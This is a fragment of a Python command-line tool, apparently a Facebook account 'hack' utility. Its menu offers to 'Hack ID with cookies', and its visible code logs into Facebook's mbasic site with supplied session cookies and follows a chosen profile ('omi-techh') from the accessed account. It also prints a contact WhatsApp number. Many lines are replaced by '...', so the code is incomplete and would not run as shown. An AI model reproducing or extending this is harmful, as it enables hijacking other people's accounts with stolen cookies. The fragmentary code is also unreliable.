...
def okcm():
    ...
    if okcm == "": 
       os.system("python okcm.py")
    else:
       sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
def moch_okcm():
    time.sleep(0.1)
    print("\033[97m [\033[96m01\033[97m] Start  Hack ID with cookies")
    print("\033[97m [\033[96m02\033[97m] Joined Grup Fb ❤️ RATU ERROR ❤️")
    print("\033[97m [\033[96m03\033[97m] Update Tools")
    print("\033[97m [\033[96m04\033[97m] Exit")
    print("\x1b[1;94m────────────────────────────────────────────────────")
    time.sleep(0.1)

    okcm=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
    if okcm == "1" or okcm =="01":
             ...
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                           ...
                           try:
                                  ...
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/omi-techh"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
         ...
         if __name__ == '__main__':
               try:
                   ...
                   aahh('\033[1;97m [\033[1;92m07\033[1;97m] whatsapp no 03088727818')
